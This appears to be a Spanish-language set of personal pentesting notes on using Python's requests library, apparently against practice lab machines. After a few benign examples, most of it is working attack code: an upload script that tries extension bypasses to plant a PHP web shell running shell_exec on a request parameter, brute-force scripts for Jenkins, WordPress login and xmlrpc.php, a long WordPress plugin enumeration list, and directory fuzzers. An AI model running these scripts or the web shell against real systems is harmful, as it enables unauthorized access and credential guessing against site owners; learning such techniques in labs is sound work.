Con la librería requests puedo hacer peticiones HTTP desde python:
```python
import requests

# Realizar una petición GET a una URL
response = requests.get('http://192.168.0.18')

print(response)
```
Y vemos que la conexión fue exitosa:
![[Pasted image 20230417135417.png]]
## DESCARGAR ARCHIVOS CON REQUESTS PYTHON
Para descargar un archivo con requests de un servidor http, podemos hacerlo de esta forma:
```python
import requests

url = 'http://192.168.0.18/numeros.sh'

response = requests.get(url)

with open('numeros.sh', 'wb') as f:
    f.write(response.content)
```
Y si lo ejecutamos, vemos que el archivo se descargó:
![[Pasted image 20230417140017.png]]
## COMPROBAR SI UNA URL ESTÁ LEVANTADA
```python
import requests

with open('urls.txt', 'r') as file:
    urls = file.readlines()

for url in urls:
    url = url.strip()  # Elimina posibles espacios en blanco
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print(f"La url {url} está levantada")
        else:
            print(f"La url {url} no está levantada, código de estado: {response.status_code}")
    except:
        print(f"La url {url} no funciona")
```
## SUBIR ARCHIVO A PANEL WEB
Tenemos el siguiente panel de subida de archivos donde subiremos con python algún archivo en .php, teniendo en cuenta que no todas las extensiones están permitidas, por lo que habría que ir probando una a una:
![[Pasted image 20240606102954.png]]
```python
import requests

extensiones = ('.phtml', '.php5', '.php4', '.phar', '.phpar')

url = 'http://172.17.0.2/upload.php'

for extension in extensiones:
    files = {
        'file': (f'virus{extension}', '<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>"; ?>', 'application/x-php')
    }
    data = {
        'submit': 'Upload File'
    }
    headers = {
        'Host': '172.17.0.2',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Origin': 'http://172.17.0.2',
        'Connection': 'close',
        'Referer': 'http://172.17.0.2/machine.php',
        'Cookie': 'SESSfb8a6402175bd59d18a885c9e379749a=8PfZe1L0ZuMYn4j1OwZyI0zbFsH5pNdBoLgWpud-gaA',
        'Upgrade-Insecure-Requests': '1'
    }

    response = requests.post(url, files=files, data=data, headers=headers)
    print(f'Respuesta de la extensión {extension}:\n{response.text}\n')
```
![[Pasted image 20240606102932.png]]
## FUERZA BRUTA FORMULARIO WEB
Por ejemplo tenemos un panel de formulario de jenkins como el siguiente:
![[Pasted image 20240609115131.png]]
Creamos el siguiente script, donde previamente interceptamos la petición con burp suite:
![[Pasted image 20240609115310.png]]
```python
import requests

url = "http://172.17.0.2:8080/j_spring_security_check"

payload = {
    'j_username': 'erfgdfgds',
    'j_password': 'rockyou',
    'from': '/',
    'Submit': ''
}

headers = {
    'Host': '172.17.0.2:8080',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://172.17.0.2:8080',
    'Connection': 'keep-alive',
    'Referer': 'http://172.17.0.2:8080/login?from=%2F',
    'Cookie': 'JSESSIONID.b04dbd66=node01f6mvw75o6x2n159uzu5n0hqng1.node0',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1'
}

response = requests.post(url, headers=headers, data=payload, allow_redirects=False)

if response.status_code == 302 and response.headers.get('Location') != 'http://172.17.0.2:8080/loginError':
    print("Login correcto con el usuario admin y contraseña rockyou")
else:
    print("Error de acceso: Login fallido")
```
Y ahora podemos adaptarlo para que vaya haciendo fuerza bruta leyendo cada línea del diccionario:
```python
import requests

url = "http://172.17.0.2:8080/j_spring_security_check"

password_file = 'diccionario.txt'

headers = {
    'Host': '172.17.0.2:8080',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://172.17.0.2:8080',
    'Connection': 'keep-alive',
    'Referer': 'http://172.17.0.2:8080/login?from=%2F',
    'Cookie': 'JSESSIONID.b04dbd66=node01f6mvw75o6x2n159uzu5n0hqng1.node0',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1'
}

with open(password_file, 'r') as file:
    for line in file:
        password = line.strip()
        payload = {
            'j_username': 'admin',
            'j_password': password,
            'from': '/',
            'Submit': ''
        }

        response = requests.post(url, headers=headers, data=payload, allow_redirects=False)

        if response.status_code == 302 and response.headers.get('Location') != 'http://172.17.0.2:8080/loginError':
            print(f"Login correcto con el usuario admin y contraseña {password}")
            break
        else:
            print(f"Login fallido con la contraseña {password}")
```
![[Pasted image 20240609115642.png]]
## FUERZA BRUTA FORMULARIO WEB WORDPRESS
Capturamos igualmente la petición con burp suite y ejecutamos el siguiente código:
```python
import requests
from bs4 import BeautifulSoup

url = "http://escolares.dl/wordpress/wp-login.php"

password_file = 'diccionario.txt'

headers = {
    'Host': 'escolares.dl',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://escolares.dl',
    'Connection': 'keep-alive',
    'Referer': 'http://escolares.dl/wordpress/wp-login.php',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1'
}

with open(password_file, 'r') as file:
    for line in file:
        password = line.strip()
        payload = {
            'log': 'luisillo',
            'pwd': password,
            'wp-submit': 'Acceder',
            'redirect_to': 'http://escolares.dl/wordpress/wp-admin/',
            'testcookie': '1'
        }

        with requests.Session() as session:
            session.get(url, headers=headers) # Realizar una solicitud GET inicial
            
            response = session.post(url, headers=headers, data=payload, allow_redirects=True) # Enviar la solicitud POST de inicio de sesión
            
            soup = BeautifulSoup(response.text, 'html.parser')
            error_message = soup.find('div', {'id': 'login_error'})
            
            print(f"Intentando con la contraseña: {password}")
            
            if error_message:
                print(f"Login fallido con la contraseña {password}")
            else:
                print(f"Login correcto con el usuario luisillo y contraseña {password}")
                break
```
Teniendo en cuenta cómo leer la respuesta del formulario con beautifulsoup:
![[Pasted image 20240609123000.png]]
![[Pasted image 20240609122746.png]]
## FUERZA BRUTA XMLRPC.PHP
```python
import requests
import signal

def salir(sig, frame):
    exit()

signal.signal(signal.SIGINT, salir)

url = 'http://172.22.0.2/wordpress/xmlrpc.php'
username = 'luisillo'
rockyou_path = 'diccionario.txt'

with open(rockyou_path, 'r', encoding='latin-1') as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()
    
    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>{username}</value></param> 
<param><value>{password}</value></param> 
</params>     
</methodCall>"""
    
    print(f"[+] Probamos con la contraseña {password}")
    
    response = requests.post(url, data=xml_payload)

    if 'incorrectos.' not in response.text:
        print(f"[+] La contraseña del usuario {username} es {password}")
        sys.exit(0)
```
## ENUMERACIÓN DE PLUGINS DE WORDPRESS
```python
import requests

# Tupla con el listado de plugins
plugins = (
    "jetpack",
    "akismet",
    "contact-form-7",
    "woocommerce",
    "wordfence",
    "yoast-seo",
    "elementor",
    "w3-total-cache",
    "updraftplus",
    "wpforms",
    "all-in-one-seo-pack",
    "google-analytics-for-wordpress",
    "really-simple-ssl",
    "wordfence-security",
    "classic-editor",
    "disable-comments",
    "smush",
    "mailchimp-for-wp",
    "redirection",
    "shortpixel-image-optimizer",
    "duplicate-post",
    "monsterinsights",
    "tablepress",
    "ninja-forms",
    "wp-optimize",
    "broken-link-checker",
    "cookie-notice",
    "advanced-custom-fields",
    "the-events-calendar",
    "easy-wp-smtp",
    "seo-press",
    "elementor-pro",
    "rank-math",
    "wp-rocket",
    "bbpress",
    "buddypress",
    "wp-super-cache",
    "mailpoet",
    "yoast-seo-premium",
    "ultimate-member",
    "woocommerce-subscriptions",
    "wp-job-manager",
    "regenerate-thumbnails",
    "revslider",
    "revive-old-post",
    "wp-fastest-cache",
    "simple-301-redirects",
    "wordfence-login-security",
    "wp-smush-pro",
    "ithemes-security",
    "nextgen-gallery",
    "wp-migrate-db",
    "duplicator",
    "really-simple-captcha",
    "autoptimize",
    "social-media-widget",
    "add-to-any",
    "disqus-comment-system",
    "broken-link-manager",
    "pretty-link",
    "simple-tags",
    "advanced-excerpt",
    "better-click-to-tweet",
    "wp-polls",
    "wordpress-popular-posts",
    "ad-inserter",
    "wp-mail-smtp",
    "easy-digital-downloads",
    "give",
    "loco-translate",
    "bbpress",
    "buddypress",
    "sucuri-scanner",
    "envira-gallery",
    "soliloquy",
    "my-calendar",
    "wp-google-maps",
    "custom-post-type-ui",
    "members",
    "query-monitor",
    "theme-check",
    "user-role-editor",
    "woocommerce-gateway-stripe",
    "woocommerce-services",
    "yith-woocommerce-wishlist",
    "yith-woocommerce-compare",
    "simple-share-buttons-adder",
    "the-events-calendar-pro",
    "under-construction-page",
    "wp-optimize-premium",
    "backupbuddy",
    "wp-all-import",
    "wp-offload-media",
    "wp-all-export",
    "ultimate-social-media-icons",
    "real-cookie-banner",
    "litespeed-cache",
    "loginizer",
    "under-construction",
    "wp-maintenance-mode",
    "hummingbird-performance",
    "push-engage",
    "easy-social-share-buttons",
    "post-smtp",
    "advanced-custom-fields-pro",
    "google-site-kit",
    "amp",
    "autoptimize",
    "better-wp-security",
    "blubrry-powerpress",
    "contact-form-7-datepicker",
    "easy-affiliate-links",
    "easy-theme-and-plugin-upgrades",
    "insert-headers-and-footers",
    "mc4wp-mailchimp-for-wordpress",
    "post-types-order",
    "restrict-content-pro",
    "simple-history",
    "simple-local-avatars",
    "simple-sitemap",
    "simple-social-icons",
    "smush-pro",
    "social-icons-widget-by-wpzoom",
    "the-events-calendar-shortcode",
    "the-seo-framework",
    "updraftplus-premium",
    "wp-cfm",
    "wp-rollback",
    "wp-user-avatar",
    "wp-user-frontend",
    "yith-woocommerce-ajax-search",
    "yith-woocommerce-ajax-product-filter",
    "yith-woocommerce-quick-view",
    "yith-woocommerce-request-a-quote",
    "yith-woocommerce-catalog-mode",
    "yith-woocommerce-badge-management",
    "yith-woocommerce-compare",
    "yith-woocommerce-featured-video",
    "yith-woocommerce-questions-and-answers",
    "yith-woocommerce-product-bundles",
    "yith-woocommerce-product-gallery-magnifier",
    "yith-woocommerce-tab-manager",
    "yith-woocommerce-wishlist",
    "yoast-comment-hacks",
    "wordfence-central",
    "wp-mail-bank",
    "wp-multibyte-patch",
    "wp-photo-album-plus",
    "wp-postratings",
    "wp-recipe-maker",
    "wp-review",
    "wp-simple-firewall",
    "wp-staging",
    "wp-statistics",
    "wp-super-cache",
    "wp-to-buffer",
    "wp-to-twitter",
    "wp-tune-up",
    "wp-ulike",
    "wp-useronline",
    "wp-webhooks",
    "wp-whatsapp-button",
    "wp-whatsapp-chat",
    "wp-wpbakery-page-builder",
    "wpcf7-mailchimp-extension",
    "wpcf7-redirect",
    "wpcf7-recaptcha",
    "wpcf7-submission",
    "wpcf7-to-database-extension",
    "wpcf7-wpml",
    "wpeverest-user-registration",
    "wpforms-constant-contact",
    "wpforms-drip",
    "wpforms-form-abandonment",
    "wpforms-mailchimp",
    "wpforms-marketing-campaigns",
    "wpforms-uploads",
    "wpml-translation-management",
    "wp-offload-s3",
    "wp-offload-ses",
    "wpmudev-upfront-builder",
    "wpmudev-snapshot",
    "wpmudev-smartcrawl",
    "wpmudev-marketpress",
    "wpmudev-bp-activity",
    "wpmudev-bp-group-calendar",
    "wpmudev-bp-group-documents",
    "wpmudev-bp-group-email",
    "wpmudev-bp-group-hierarchy",
    "wpmudev-bp-group-organizer",
    "wpmudev-bp-groupblog",
    "wpmudev-bp-links",
    "wpmudev-bp-livestream",
    "wpmudev-bp-lockdown",
    "wpmudev-bp-mass-messaging",
    "wpmudev-bp-polls",
    "wpmudev-bp-privacy",
    "wpmudev-bp-simple-events",
    "wpmudev-bp-social",
    "wpmudev-bp-social-media",
    "wpmudev-bp-translate",
    "wpmudev-bp-twitter",
    "wpmudev-bp-user-profile-completion",
    "wpmudev-bp-user-profile-fields",
    "wpmudev-bp-user-profile-visibility",
    "wpmudev-bp-user-status",
    "wpmudev-bp-xprofile-custom-fields",
    "wpmudev-coursepress",
    "wpmudev-dashboard",
    "wpmudev-defender",
    "wpmudev-domain-mapping",
    "wpmudev-edd-pushover",
    "wpmudev-e-newsletter",
    "wpmudev-events-plus",
    "wpmudev-facebook",
    "wpmudev-friends",
    "wpmudev-gridbuilder",
    "wpmudev-hivepress",
    "wpmudev-hummingbird",
    "wpmudev-infinite-sessions",
    "wpmudev-login-safety",
    "wpmudev-membership",
    "wpmudev-membership-premium",
    "wpmudev-membership-ultimate",
    "wpmudev-membership2",
    "wpmudev-multisite-privacy",
    "wpmudev-pro-sites",
    "wpmudev-qa",
    "wpmudev-qtranslate-x",
    "wpmudev-reports",
    "wpmudev-saml",
    "wpmudev-saml-service-provider",
    "wpmudev-simple-css",
    "wpmudev-single-sign-on",
    "wpmudev-smartsso",
    "wpmudev-support",
    "wpmudev-support-system",
    "wpmudev-tips",
    "wpmudev-tutoring",
    "wpmudev-unlimited-smtp",
    "wpmudev-upfront",
    "wpmudev-upfront-contact",
    "wpmudev-upfront-media",
    "wpmudev-upfront-parallax",
    "wpmudev-upfront-portfolio",
    "wpmudev-upfront-posts",
    "wpmudev-upfront-starter",
    "wpmudev-upfront-studio",
    "wpmudev-upfront-symbiostock",
    "wpmudev-upfront-widgets",
    "wpmudev-user-blogs",
    "wpmudev-widgets-for-sitebuilder",
    "wpmudev-wp-blogandplugin",
    "wpmudev-wp-user-control",
    "wpmudev-wp-usercontrol",
    "wpmudev-wpmudev",
    "wpmudev-wunderplugin",
    "wp-optimize-premium"
    "revslider",
    "visual-composer",
    "wp-statistics",
    "userpro",
    "gravityforms",
    "all-in-one-wp-migration",
    "duplicator",
    "wpfastestcache",
    "ninja-forms",
    "wordfence",
    "wp-file-manager",
    "file-manager",
    "file-manager-advanced",
    "download-manager",
    "wp-easycart",
    "wp-ultimate-csv-importer",
    "wp-job-manager",
    "wpdiscuz",
    "wordfence",
    "formidable",
    "brizy",
    "site-editor",
    "wpdatatables",
    "members",
    "real-estate-7",
    "wp-mail-smtp",
    "woo-gutenberg-products-block",
    "essential-addons-for-elementor-lite",
    "paid-memberships-pro",
    "wp-customer-area",
    "slider-hero",
    "simple-301-redirects",
    "yith-woocommerce-gift-cards",
    "wpmu-dev-facebook",
    "wpmu-dev-chat",
    "wpmu-dev-defender",
    "wpmu-dev-dashboard",
    "wpmu-dev-forminator",
    "wpmu-dev-membership-2",
    "wpmu-dev-hummingbird",
    "wpmu-dev-ibbu",
    "wpmu-dev-mailchimp",
    "wpmu-dev-snapshot",
    "wpmu-dev-support",
    "wpmu-dev-upfront",
    "wpmu-dev-vc-templating",
    "wpmu-dev-videopress",
    "wpmu-dev-wp-forminator"
)

# URL base
base_url = "http://172.22.0.2/wordpress/wp-content/plugins/"

def check_plugin(plugin):
    url = f"{base_url}{plugin}/readme.txt"
    response = requests.get(url)
    if response.status_code == 200:
        print(f"[+] Plugin encontrado: {plugin}")
    else:
        pass

# Iterar sobre cada plugin y verificar si existe
for plugin in plugins:
    check_plugin(plugin)
```
Podemos agrupar ambos códigos cada uno en una función:
```python
import requests

def bruteforce():
    url = 'http://172.17.0.2/wordpress/xmlrpc.php'
    username = 'luisillo'
    rockyou_path = 'diccionario.txt'

    with open(rockyou_path, 'r', encoding='latin-1') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        
        xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
	    <methodCall> 
	    <methodName>wp.getUsersBlogs</methodName> 
	    <params> 
	    <param><value>{username}</value></param> 
	    <param><value>{password}</value></param> 
	    </params>     
	    </methodCall>"""
        
        print(f"[+] Probamos con la contraseña {password}")
        
        response = requests.post(url, data=xml_payload)

        if 'incorrectos.' not in response.text:
            print(f"[+] La contraseña del usuario {username} es {password}")
            sys.exit(0)

def plugin_enumeration():
    plugins = (
        "jetpack",
        "akismet",
        "contact-form-7",
        "woocommerce",
        "wordfence",
        "yoast-seo",
        "elementor",
        "w3-total-cache",
        "updraftplus",
        "wpforms",
        "wpmu-dev-forminator"
    )

    base_url = "http://172.17.0.2/wordpress/wp-content/plugins/"

    for plugin in plugins:
	    url = f"{base_url}{plugin}/readme.txt"
	    response = requests.get(url)
	    if response.status_code == 200:
	        print(f"[+] Plugin encontrado: {plugin}")
	    else:
	        pass

choice = input("Introduce 1 para ejecutar la función 'bruteforce' o 2 para ejecutar 'plugin_enumeration': ")

if choice == '1':
    bruteforce()
elif choice == '2':
    plugin_enumeration()
else:
    print("Opción no válida.")
```
## FUZZING WEB CON PYTHON
Podemos hacer fuzzing con python usando el siguiente código:
```python
import argparse
import requests
from tqdm import tqdm

parser = argparse.ArgumentParser(description="Script de fuzzing de directorios web")
parser.add_argument("url", help="URL base para el fuzzing")
parser.add_argument("diccionario", help="Archivo de diccionario")
args = parser.parse_args()

with open(args.diccionario) as file:
    wordlist = file.read().splitlines()

try:
    barrita = tqdm(total=len(wordlist), desc="Progreso", unit="urls", dynamic_ncols=True)

    for linea in wordlist:
        url_completa = args.url + linea  

        response = requests.get(url_completa)

        if response.status_code == 200:
            tqdm.write(f"Directorio encontrado: {url_completa}")

        barrita.update(1)

except KeyboardInterrupt:
    print("\nScript interrumpido por el usuario (Ctrl + C).")
finally:
    barrita.close()
```
![[Pasted image 20230917121721.png]]
O también podemos simplificar el código:
```python
import requests

url = input("Introduce la URL: ")
diccionario = input("Introduce el diccionario: ")

with open(diccionario, 'r') as file:
    wordlist = file.read().splitlines()

try:
    for linea in wordlist:
        url_completa = url + linea  

        response = requests.get(url_completa)

        if response.status_code == 200:
            print(f"Directorio encontrado: {url_completa}")


except KeyboardInterrupt:
    print("\nScript interrumpido por el usuario (Ctrl + C).")
finally:
    print("Ataque finalizado")
```